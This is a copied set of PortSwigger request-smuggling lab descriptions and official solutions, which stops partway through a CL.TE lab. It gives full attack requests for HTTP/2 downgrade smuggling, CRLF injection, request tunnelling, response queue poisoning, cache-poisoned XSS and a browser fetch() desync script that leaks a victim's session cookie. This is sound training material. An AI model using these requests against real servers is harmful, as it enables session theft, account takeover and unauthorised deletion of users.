# PortSwigger labs: request smuggling

> Copied from <https://portswigger.net/web-security/request-smuggling>. Questions and answers are the source's own; nothing was answered or rewritten here.


## 1. 0.CL request smuggling

[Open the lab](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-0cl-request-smuggling)

This lab is vulnerable to 0.CL request smuggling.

Carlos visits the homepage every five seconds. To solve the lab, exploit the vulnerability to execute `alert()` in his browser.

#### Required knowledge

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For full details on 0.CL request smuggling, see the [HTTP/1.1 Must Die](https://portswigger.net/research/http1-must-die) whitepaper by James Kettle.

<details><summary>Official solution</summary>

##### Livestream with James Kettle

https://www.youtube.com/watch?v=B7p8dIB7bFg

</details>


## 2. H2.CL request smuggling

[Open the lab](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling)

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, perform a request smuggling attack that causes the victim's browser to load and execute a malicious JavaScript file from the exploit server, calling `alert(document.cookie)`. The victim user accesses the home page every 10 seconds.

<details><summary>Hint</summary>

- Solving this lab requires a technique that we covered in the earlier [HTTP request smuggling materials](https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect)
- You need to poison the connection immediately before the victim's browser attempts to import a JavaScript resource. Otherwise, it will fetch your payload from the exploit server but not execute it. You may need to repeat the attack several times before you get the timing right.

</details>

<details><summary>Official solution</summary>

1. Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request by including a `Content-Length: 0` header as follows. Remember to expand the Inspector's **Request Attributes** section and make sure the protocol is set to HTTP/2 before sending the request.

   `POST / HTTP/2
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Length: 0
   SMUGGLED`
2. Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
3. Using Burp Repeater, notice that if you send a request for `GET /resources`, you are redirected to `https://YOUR-LAB-ID.web-security-academy.net/resources/`.
4. Create the following request to smuggle the start of a request for `/resources`, along with an arbitrary `Host` header:

   `POST / HTTP/2
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Length: 0
   GET /resources HTTP/1.1
   Host: foo
   Content-Length: 5
   x=1`
5. Send the request a few times. Notice that smuggling this prefix past the front-end allows you to redirect the subsequent request on the connection to an arbitrary host.
6. Go to the exploit server and change the file path to `/resources`. In the body, enter the payload `alert(document.cookie)`, then store the exploit.
7. In Burp Repeater, edit your malicious request so that the `Host` header points to your exploit server:

   `POST / HTTP/2
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Length: 0
   GET /resources HTTP/1.1
   Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
   Content-Length: 5
   x=1`
8. Send the request a few times and confirm that you receive a redirect to the exploit server.
9. Resend the request and wait for 10 seconds or so.
10. Go to the exploit server and check the access log. If you see a `GET /resources/` request from the victim, this indicates that your request smuggling attack was successful. Otherwise, check that there are no issues with your attack request and try again.
11. Once you have confirmed that you can cause the victim to be redirected to the exploit server, repeat the attack until the lab solves. This may take several attempts because you need to time your attack so that it poisons the connection immediately before the victim's browser attempts to import a JavaScript resource. Otherwise, although their browser will load your malicious JavaScript, it won't execute it.

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=n2k5zdA0ycg

##### InfoSec

https://www.youtube.com/watch?v=I2fsgxruPek

</details>


## 3. HTTP/2 request smuggling via CRLF injection

[Open the lab](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection)

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

To solve the lab, use an HTTP/2-exclusive request smuggling vector to gain access to another user's account. The victim accesses the home page every 15 seconds.

If you're not familiar with Burp's exclusive features for HTTP/2 testing, please refer to [the documentation](https://portswigger.net/burp/documentation/desktop/http2) for details on how to use them.

<details><summary>Hint</summary>

To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the `Shift + Return` keys. Note that this feature is not available when you double-click on the header.

</details>

<details><summary>Hint</summary>

We covered some ways you can capture other users' requests via request smuggling in a [previous lab](https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests).

</details>

<details><summary>Official solution</summary>

1. In Burp's browser, use the lab's search function a couple of times and observe that the website records your recent search history. Send the most recent `POST /` request to Burp Repeater and remove your session cookie before resending the request. Notice that your search history is reset, confirming that it's tied to your session cookie.
2. Expand the Inspector's **Request Attributes** section and make sure the protocol is set to HTTP/2.
3. Using the Inspector, add an arbitrary header to the request. Append the sequence `\r\n` to the header's value, followed by the `Transfer-Encoding: chunked` header:

   **Name**

   `foo`

   **Value**

   `bar\r\n
   Transfer-Encoding: chunked`
4. In the body, attempt to smuggle an arbitrary prefix as follows:

   `0
   SMUGGLED`

   Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix
5. Change the body of the request to the following:

   `0
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Cookie: session=YOUR-SESSION-COOKIE
   Content-Length: 800
   search=x`
6. Send the request, then immediately refresh the page in the browser. The next step depends on which response you receive:

   - If you got lucky with your timing, you may see a `404 Not Found` response. In this case, refresh the page again and move on to the next step.
   - If you instead see the search results page, observe that the start of your request is reflected on the page because it was appended to the `search=x` parameter in the smuggled prefix. In this case, send the request again, but this time wait for 15 seconds before refreshing the page. If you see a 404 response, just refresh the page again.
7. Check the recent searches list. If it contains a `GET` request, this is the start of the victim user's request and includes their session cookie. If you instead see your own `POST` request, you refreshed the page too early. Try again until you have successfully stolen the victim's session cookie.
8. In Burp Repeater, send a request for the home page using the stolen session cookie to solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=unVNdJ1IWpw

##### InfoSec

https://www.youtube.com/watch?v=W3BGHKyf8RY

</details>


## 4. HTTP/2 request splitting via CRLF injection

[Open the lab](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

To solve the lab, delete the user `carlos` by using [response queue poisoning](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning) to break into the admin panel at `/admin`. An admin user will log in approximately every 10 seconds.

The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection.

<details><summary>Hint</summary>

To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the `Shift + Return` keys. Note that this feature is not available when you double-click on the header.

</details>

<details><summary>Official solution</summary>

1. Send a request for `GET /` to Burp Repeater. Expand the Inspector's **Request Attributes** section and make sure the protocol is set to HTTP/2.
2. Change the path of the request to a non-existent endpoint, such as `/x`. This means that your request will always get a 404 response. Once you have poisoned the response queue, this will make it easier to recognize any other users' responses that you have successfully captured.
3. Using the Inspector, append an arbitrary header to the end of the request. In the header value, inject `\r\n` sequences to split the request so that you're smuggling another request to a non-existent endpoint as follows:

   **Name**

   `foo`

   **Value**

   `bar\r\n
   \r\n
   GET /x HTTP/1.1\r\n
   Host: YOUR-LAB-ID.web-security-academy.net`
4. Send the request. When the front-end server appends `\r\n\r\n` to the end of the headers during downgrading, this effectively converts the smuggled prefix into a complete request, poisoning the response queue.
5. Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie.

   #### Note

   If you receive some 200 responses but can't capture a 302 response even after a lot of attempts, send 10 ordinary requests to reset the connection and try again.
6. Copy the session cookie and use it to send the following request:

   `GET /admin HTTP/2
   Host: YOUR-LAB-ID.web-security-academy.net
   Cookie: session=STOLEN-SESSION-COOKIE`
7. Send the request repeatedly until you receive a 200 response containing the admin panel.
8. In the response, find the URL for deleting `carlos` (`/admin/delete?username=carlos`), then update the path in your request accordingly. Send the request to delete `carlos` to solve the lab.

</details>


## 5. Bypassing access controls via HTTP/2 request tunnelling

[Open the lab](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling)

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming header names. To solve the lab, access the admin panel at `/admin` as the `administrator` user and delete the user `carlos`.

The front-end server doesn't reuse the connection to the back-end, so isn't vulnerable to classic request smuggling attacks. However, it is still vulnerable to [request tunnelling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling).

<details><summary>Hint</summary>

The front-end server appends a series of [client authentication headers](https://portswigger.net/web-security/request-smuggling/exploiting#bypassing-client-authentication) to incoming requests. You need to find a way of leaking these.

</details>

<details><summary>Official solution</summary>

1. Send the `GET /` request to Burp Repeater. Expand the Inspector's **Request Attributes** section and make sure the protocol is set to HTTP/2.
2. Using the Inspector, append an arbitrary header to the end of the request and try smuggling a `Host` header in its name as follows:

   **Name**

   `foo: bar\r\n
   Host: abc`

   **Value**

   `xyz`

   Observe that the error response indicates that the server processes your injected host, confirming that the lab is vulnerable to CRLF injection via header names.
3. In the browser, notice that the lab's search function reflects your search query in the response. Send the most recent `GET /?search=YOUR-SEARCH-QUERY` request to Burp Repeater and upgrade it to an HTTP/2 request.
4. In Burp Repeater, right-click on the request and select **Change request method**. Send the request and notice that the search function still works when you send the `search` parameter in the body of a `POST` request.
5. Add an arbitrary header and use its name field to inject a large `Content-Length` header and an additional `search` parameter as follows:

   **Name**

   `foo: bar\r\n
   Content-Length: 500\r\n
   \r\n
   search=x`

   **Value**

   `xyz`
6. In the main body of the request (in the message editor panel) append arbitrary characters to the original `search` parameter until the request is longer than the smuggled `Content-Length` header.
7. Send the request and observe that the response now reflects the headers that were appended to your request by the front-end server:

   `0 search results for 'x: xyz
   Content-Length: 644
   cookie: session=YOUR-SESSION-COOKIE
   X-SSL-VERIFIED: 0
   X-SSL-CLIENT-CN: null
   X-FRONTEND-KEY: YOUR-UNIQUE-KEY`

   Notice that these appear to be headers used for [client authentication](https://portswigger.net/web-security/request-smuggling/exploiting#bypassing-client-authentication).
8. Change the request method to `HEAD` and edit your malicious header so that it smuggles a request for the admin panel. Include the three client authentication headers, making sure to update their values as follows:

   **Name**

   `foo: bar\r\n
   \r\n
   GET /admin HTTP/1.1\r\n
   X-SSL-VERIFIED: 1\r\n
   X-SSL-CLIENT-CN: administrator\r\n
   X-FRONTEND-KEY: YOUR-UNIQUE-KEY\r\n
   \r\n`

   **Value**

   `xyz`
9. Send the request and observe that you receive an error response saying that not enough bytes were received. This is because the `Content-Length` of the requested resource is longer than the tunnelled response you're trying to read.
10. Change the `:path` pseudo-header so that it points to an endpoint that returns a shorter resource. In this case, you can use `/login`.
11. Send the request again. You should see the start of the tunnelled HTTP/1.1 response nested in the body of your main response.
12. In the response, find the URL for deleting `carlos` (`/admin/delete?username=carlos`), then update the path in your tunnelled request accordingly and resend it. Although you will likely encounter an error response,
    `carlos` is deleted and the lab is solved.

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=5Xqy0Qvi-S0

</details>


## 6. Web cache poisoning via HTTP/2 request tunnelling

[Open the lab](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling)

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and doesn't consistently sanitize incoming headers.

To solve the lab, poison the cache in such a way that when the victim visits the home page, their browser executes `alert(1)`. A victim user will visit the home page every 15 seconds.

The front-end server doesn't reuse the connection to the back-end, so isn't vulnerable to classic request smuggling attacks. However, it is still vulnerable to [request tunnelling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling).

<details><summary>Official solution</summary>

1. Send a request for `GET /` to Burp Repeater. Expand the Inspector's **Request Attributes** section and make sure the protocol is set to HTTP/2.
2. Using the Inspector, try smuggling an arbitrary header in the `:path` pseudo-header, making sure to preserve a valid request line for the downgraded request as follows:

   **Name**

   `:path`

   **Value**

   `/?cachebuster=1 HTTP/1.1\r\n
   Foo: bar`

   Observe that you still receive a normal response, confirming that you're able to inject via the `:path`.
3. Change the request method to `HEAD` and use the `:path` pseudo-header to tunnel a request for another arbitrary endpoint as follows:

   **Name**

   `:path`

   **Value**

   `/?cachebuster=2 HTTP/1.1\r\n
   Host: YOUR-LAB-ID.web-security-academy.net\r\n
   \r\n
   GET /post?postId=1 HTTP/1.1\r\n
   Foo: bar`

   Note that we've ensured that the main request is valid by including a `Host` header before the split. We've also left an arbitrary trailing header to capture the `HTTP/1.1` suffix that will be appended to the request line by the front-end during rewriting.
4. Send the request and observe that you are able to view the tunnelled response. If you can't, try using a different `postId`.
5. Remove everything except the path and cachebuster query parameter from the `:path` pseudo-header and resend the request. Observe that you have successfully poisoned the cache with the tunnelled response.
6. Now you need to find a gadget that reflects an HTML-based XSS payload without encoding or escaping it. Send a response for `GET /resources` and observe that this triggers a redirect to `/resources/`.
7. Try tunnelling this request via the `:path` pseudo-header, including an XSS payload in the query string as follows.

   **Name**

   `:path`

   **Value**

   `/?cachebuster=3 HTTP/1.1\r\n
   Host: YOUR-LAB-ID.web-security-academy.net\r\n
   \r\n
   GET /resources?<script>alert(1)</script> HTTP/1.1\r\n
   Foo: bar`

   Observe that the request times out. This is because the `Content-Length` header in the main response is longer than the nested response to your tunnelled request.
8. From the proxy history, check the `Content-Length` in the response to a normal `GET /` request and make a note of its value. Go back to your malicious request in Burp Repeater and add enough arbitrary characters after the closing `</script>` tag to pad your reflected payload so that the length of the tunnelled response will exceed the `Content-Length` you just noted.
9. Send the request and confirm that your payload is successfully reflected in the tunnelled response. If you still encounter a timeout, you may not have added enough padding.
10. While the cache is still poisoned, visit the home page using the same cachebuster query parameter and confirm that the `alert()` fires.
11. In the Inspector, remove the cachebuster from your request and resend it until you have poisoned the cache. Keep resending the request every 5 seconds or so to keep the cache poisoned until the victim visits the home page and the lab is solved.

</details>

<details><summary>Community solutions</summary>

##### Sam Bowne

https://www.youtube.com/watch?v=UDqz1GJ8b6Q

</details>


## 7. Response queue poisoning via H2.TE request smuggling

[Open the lab](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, delete the user `carlos` by using response queue poisoning to break into the admin panel at `/admin`. An admin user will log in approximately every 15 seconds.

The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection.

<details><summary>Official solution</summary>

1. Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request using chunked encoding as follows. Remember to expand the Inspector's **Request Attributes** section and make sure the protocol is set to HTTP/2 before sending the request.

   `POST / HTTP/2
   Host: YOUR-LAB-ID.web-security-academy.net
   Transfer-Encoding: chunked
   0
   SMUGGLED`
2. Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
3. In Burp Repeater, create the following request, which smuggles a complete request to the back-end server. Note that the path in both requests points to a non-existent endpoint. This means that your request will always get a 404 response. Once you have poisoned the response queue, this will make it easier to recognize any other users' responses that you have successfully captured.

   `POST /x HTTP/2
   Host: YOUR-LAB-ID.web-security-academy.net
   Transfer-Encoding: chunked
   0
   GET /x HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net`

   #### Note

   Remember to terminate the smuggled request properly by including the sequence `\r\n\r\n` after the `Host` header.
4. Send the request to poison the response queue. You will receive the 404 response to your own request.
5. Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie.

   #### Note

   If you receive some 200 responses but can't capture a 302 response even after a lot of attempts, send 10 ordinary requests to reset the connection and try again.
6. Copy the session cookie and use it to send the following request:

   `GET /admin HTTP/2
   Host: YOUR-LAB-ID.web-security-academy.net
   Cookie: session=STOLEN-SESSION-COOKIE`
7. Send the request repeatedly until you receive a 200 response containing the admin panel.
8. In the response, find the URL for deleting `carlos` (`/admin/delete?username=carlos`), then update the path in your request accordingly. Send the request to delete `carlos` and solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=PeYdUHME7e8

</details>


## 8. CL.0 request smuggling

[Open the lab](https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling)

This lab is vulnerable to CL.0 request smuggling attacks. The back-end server ignores the `Content-Length` header on requests to some endpoints.

To solve the lab, identify a vulnerable endpoint, smuggle a request to the back-end to access to the admin panel at `/admin`, then delete the user `carlos`.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks#cl.0).

<details><summary>Official solution</summary>

**Probe for vulnerable endpoints**

1. From the **Proxy > HTTP history**, send the `GET /` request to Burp Repeater twice.
2. In Burp Repeater, add both of these tabs to a new group.
3. Go to the first request and convert it to a `POST` request (right-click and select **Change request method**).
4. In the body, add an arbitrary request smuggling prefix. The result should look something like this:

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Cookie: session=YOUR-SESSION-COOKIE
   Connection: close
   Content-Type: application/x-www-form-urlencoded
   Content-Length: CORRECT
   GET /hopefully404 HTTP/1.1
   Foo: x`
5. Change the path of the main `POST` request to point to an arbitrary endpoint that you want to test.
6. Using the drop-down menu next to the **Send** button, change the send mode to **Send group in sequence (single connection)**.
7. Change the `Connection` header of the first request to `keep-alive`.
8. Send the sequence and check the responses.

   - If the server responds to the second request as normal, this endpoint is not vulnerable.
   - If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this indicates that the back-end server is ignoring the `Content-Length` of requests.
9. Deduce that you can use requests for static files under `/resources`, such as `/resources/images/blog.svg`, to cause a CL.0 desync.

**Exploit**

1. In Burp Repeater, change the path of your smuggled prefix to point to `/admin`.
2. Send the requests in sequence again and observe that the second request has successfully accessed the admin panel.
3. Smuggle a request to `GET /admin/delete?username=carlos` request to solve the lab.

   `POST /resources/images/blog.svg HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Cookie: session=YOUR-SESSION-COOKIE
   Connection: keep-alive
   Content-Length: CORRECT
   GET /admin/delete?username=carlos HTTP/1.1
   Foo: x`

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=9zgDC5j58p8

</details>


## 9. Client-side desync

[Open the lab](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)

This lab is vulnerable to client-side desync attacks because the server ignores the `Content-Length` header on requests to some endpoints. You can exploit this to induce a victim's browser to disclose its session cookie.

To solve the lab:

1. Identify a client-side desync vector in Burp, then confirm that you can replicate this in your browser.
2. Identify a gadget that enables you to store text data within the application.
3. Combine these to craft an exploit that causes the victim's browser to issue a series of cross-domain requests that leak their session cookie.
4. Use the stolen cookie to access the victim's account.

<details><summary>Hint</summary>

This lab is a client-side variation of a technique we covered in a [previous request smuggling lab](https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests).

</details>

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks#csd).

<details><summary>Official solution</summary>

**Identify a vulnerable endpoint**

1. Notice that requests to `/` result in a redirect to `/en`.
2. Send the `GET /` request to Burp Repeater.
3. In Burp Repeater, use the tab-specific settings to disable the **Update Content-Length** option.
4. Convert the request to a `POST` request (right-click and select **Change request method**).
5. Change the `Content-Length` to 1 or higher, but leave the body empty.
6. Send the request. Observe that the server responds immediately rather than waiting for the body. This suggests that it is ignoring the specified `Content-Length`.

**Confirm the desync vector in Burp**

1. Re-enable the **Update Content-Length** option.
2. Add an arbitrary request smuggling prefix to the body:

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.h1-web-security-academy.net
   Connection: close
   Content-Length: CORRECT
   GET /hopefully404 HTTP/1.1
   Foo: x`
3. Add a normal request for `GET /` to the tab group, after your malicious request.
4. Using the drop-down menu next to the **Send** button, change the send mode to **Send group in sequence (single connection)**.
5. Change the `Connection` header of the first request to `keep-alive`.
6. Send the sequence and check the responses. If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this confirms that you can cause a desync.

**Replicate the desync vector in your browser**

1. Open a separate instance of Chrome that is **not** proxying traffic through Burp.
2. Go to the exploit server.
3. Open the browser developer tools and go to the **Network** tab.
4. Ensure that the **Preserve log** option is selected and clear the log of any existing entries.
5. Go to the **Console** tab and replicate the attack from the previous section using the `fetch()` API as follows:

   `fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
   method: 'POST',
   body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
   mode: 'cors',
   credentials: 'include',
   }).catch(() => {
   fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
   mode: 'no-cors',
   credentials: 'include'
   })
   })`

   Note that we're intentionally triggering a CORS error to prevent the browser from following the redirect, then using the `catch()` method to continue the attack sequence.
6. On the **Network** tab, you should see two requests:

   - The main request, which has triggered a CORS error.
   - A request for the home page, which received a 404 response.

   This confirms that the desync vector can be triggered from a browser.

**Identify an exploitable gadget**

1. Back in Burp's browser, visit one of the blog posts and observe that this lab contains a comment function.
2. From the **Proxy > HTTP history**, find the `GET /en/post?postId=x` request. Make note of the following:

   - The `postId` from the query string
   - Your `session` and `_lab_analytics` cookies
   - The `csrf` token
3. In Burp Repeater, use the desync vector from the previous section to try to capture your own arbitrary request in a comment. For example:

   Request 1:

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.h1-web-security-academy.net
   Connection: keep-alive
   Content-Length: CORRECT
   POST /en/post/comment HTTP/1.1
   Host: YOUR-LAB-ID.h1-web-security-academy.net
   Cookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE
   Content-Length: NUMBER-OF-BYTES-TO-CAPTURE
   Content-Type: x-www-form-urlencoded
   Connection: keep-alive
   csrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://ginandjuice.shop&comment=`

   Request 2:

   `GET /capture-me HTTP/1.1
   Host: YOUR-LAB-ID.h1-web-security-academy.net`

   Note that the number of bytes that you try to capture must be longer than the body of your `POST /en/post/comment` request prefix, but shorter than the follow-up request.
4. Back in the browser, refresh the blog post and confirm that you have successfully output the start of your `GET /capture-me` request in a comment.

**Replicate the attack in your browser**

1. Open a separate instance of Chrome that is **not** proxying traffic through Burp.
2. Go to the exploit server.
3. Open the browser developer tools and go to the **Network** tab.
4. Ensure that the **Preserve log** option is selected and clear the log of any existing entries.
5. Go to the **Console** tab and replicate the attack from the previous section using the `fetch()` API as follows:

   `fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
   method: 'POST',
   body: 'POST /en/post/comment HTTP/1.1\r\nHost: YOUR-LAB-ID.h1-web-security-academy.net\r\nCookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE\r\nContent-Length: NUMBER-OF-BYTES-TO-CAPTURE\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://portswigger.net&comment=',
   mode: 'cors',
   credentials: 'include',
   }).catch(() => {
   fetch('https://YOUR-LAB-ID.h1-web-security-academy.net/capture-me', {
   mode: 'no-cors',
   credentials: 'include'
   })
   })`
6. On the **Network** tab, you should see three requests:

   - The initial request, which has triggered a CORS error.
   - A request for `/capture-me`, which has been redirected to the post confirmation page.
   - A request to load the post confirmation page.
7. Refresh the blog post and confirm that you have successfully output the start of your own `/capture-me` request via a browser-initiated attack.

**Exploit**

1. Go to the exploit server.
2. In the **Body** panel, paste the script that you tested in the previous section.
3. Wrap the entire script in HTML <script> tags.
4. Store the exploit and click **Deliver to victim**.
5. Refresh the blog post and confirm that you have captured the start of the victim user's request.
6. Repeat this attack, adjusting the `Content-Length` of the nested `POST /en/post/comment` request until you have successfully output the victim's session cookie.
7. In Burp Repeater, send a request for `/my-account` using the victim's stolen cookie to solve the lab.

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=QapdENfSXzE

</details>


## 10. Server-side pause-based request smuggling

[Open the lab](https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling)

This lab is vulnerable to pause-based server-side request smuggling. The front-end server streams requests to the back-end, and the back-end server does not close the connection after a timeout on some endpoints.

To solve the lab, identify a pause-based CL.0 desync vector, smuggle a request to the back-end to the admin panel at `/admin`, then delete the user `carlos`.

#### Note

Some server-side pause-based desync vulnerabilities can't be exploited using Burp's core tools. You must use the [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988) extension to solve this lab.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks#pause).

<details><summary>Official solution</summary>

**Identify a desync vector**

1. In Burp, notice from the `Server` response header that the lab is using `Apache 2.4.52`. This version of Apache is potentially vulnerable to pause-based CL.0 attacks on endpoints that trigger server-level redirects.
2. In Burp Repeater, try issuing a request for a valid directory without including a trailing slash, for example, `GET /resources`. Observe that you are redirected to `/resources/`.
3. Right-click the request and select **Extensions > Turbo Intruder > Send to Turbo Intruder**.
4. In Turbo Intruder, convert the request to a `POST` request (right-click and select **Change request method**).
5. Change the `Connection` header to `keep-alive`.
6. Add a complete `GET /admin` request to the body of the main request. The result should look something like this:

   `POST /resources HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Cookie: session=YOUR-SESSION-COOKIE
   Connection: keep-alive
   Content-Type: application/x-www-form-urlencoded
   Content-Length: CORRECT
   GET /admin/ HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net`
7. In the Python editor panel, enter the following script. This issues the request twice, pausing for 61 seconds after the `\r\n\r\n` sequence at the end of the headers:

   `def queueRequests(target, wordlists):
   engine = RequestEngine(endpoint=target.endpoint,
   concurrentConnections=1,
   requestsPerConnection=500,
   pipeline=False
   )
   engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
   engine.queue(target.req)
   def handleResponse(req, interesting):
   table.add(req)`
8. Launch the attack. Initially, you won't see anything happening, but after 61 seconds, you should see two entries in the results table:

   - The first entry is the `POST /resources` request, which triggered a redirect to `/resources/` as normal.
   - The second entry is a response to the `GET /admin/` request. Although this just tells you that the admin panel is only accessible to local users, this confirms the pause-based CL.0 vulnerability.

**Exploit**

1. In Turbo Intruder, go back to the attack configuration screen. In your smuggled request, change the `Host` header to `localhost` and relaunch the attack.
2. After 61 seconds, notice that you have now successfully accessed the admin panel.
3. Study the response and observe that the admin panel contains an HTML form for deleting a given user. Make a note of the following details:

   - The action attribute (`/admin/delete`).
   - The name of the input (`username`).
   - The `csrf` token.
4. Go back to the attack configuration screen. Use these details to replicate the request that would be issued when submitting the form. The result should look something like this:

   `POST /resources HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Cookie: session=YOUR-SESSION-COOKIE
   Connection: keep-alive
   Content-Type: application/x-www-form-urlencoded
   Content-Length: CORRECT
   POST /admin/delete/ HTTP/1.1
   Host: localhost
   Content-Type: x-www-form-urlencoded
   Content-Length: CORRECT
   csrf=YOUR-CSRF-TOKEN&username=carlos`
5. To prevent Turbo Intruder from pausing after both occurrences of `\r\n\r\n` in the request, update the `pauseMarker` argument so that it only matches the end of the first set of headers, for example:

   `pauseMarker=['Content-Length: CORRECT\r\n\r\n']`
6. Launch the attack.
7. After 61 seconds, the lab is solved.

</details>

<details><summary>Community solutions</summary>

##### Jarno Timmermans

https://www.youtube.com/watch?v=AqxKrADAJOE

##### nu11 secur1ty

https://www.youtube.com/watch?v=GpXNxorJxA0

</details>


## 11. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

[Open the lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at `/admin`, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user `carlos`.

#### Note

Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the **Request attributes** section of the **Inspector** panel.

#### Tip

Manually fixing the length fields in request smuggling attacks can be tricky. Our [HTTP Request Smuggler](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo) Burp extension was designed to help. You can install it via the BApp Store.

<details><summary>Official solution</summary>

1. Try to visit `/admin` and observe that the request is blocked.
2. Using Burp Repeater, issue the following request twice:

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 37
   Transfer-Encoding: chunked
   0
   GET /admin HTTP/1.1
   X-Ignore: X`
3. Observe that the merged request to `/admin` was rejected due to not using the header `Host: localhost`.
4. Issue the following request twice:

   `POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 54
